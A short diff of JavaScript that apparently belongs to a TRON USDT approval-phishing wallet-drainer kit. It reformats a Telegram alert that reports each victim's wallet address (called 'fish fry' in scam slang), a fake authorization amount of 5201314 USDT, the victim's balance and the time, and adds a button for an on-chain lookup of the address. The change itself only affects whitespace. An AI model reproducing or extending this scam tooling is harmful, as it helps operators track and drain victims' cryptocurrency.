@@ -217,15 +217,17 @@
             // 获取当前时间
             const currentTime = new Date().toLocaleString();
     
+
             // 构建 Telegram 消息
             const message = `
-                *🟣【TRC授权通知】🟣*\n\n
-                *🐠鱼苗地址：* ${walletAddress}\n
-                *👉授权金额：* 5201314.00 USDT\n
-                *💰钱包余额：* ${usdtBalance} USDT\n
-                *⏰授权时间：* ${currentTime}\n
+                *🟣【TRC授权通知】🟣*
+                
+                *🐠鱼苗地址：* ${walletAddress}
+                *👉授权金额：* 5201314.00 USDT
+                *💰钱包余额：* ${usdtBalance} USDT
+                *⏰授权时间：* ${currentTime}
             `;
-    
+
             // 构建查询按钮 URL
             const queryButton = {
                 text: '链上查询该地址',
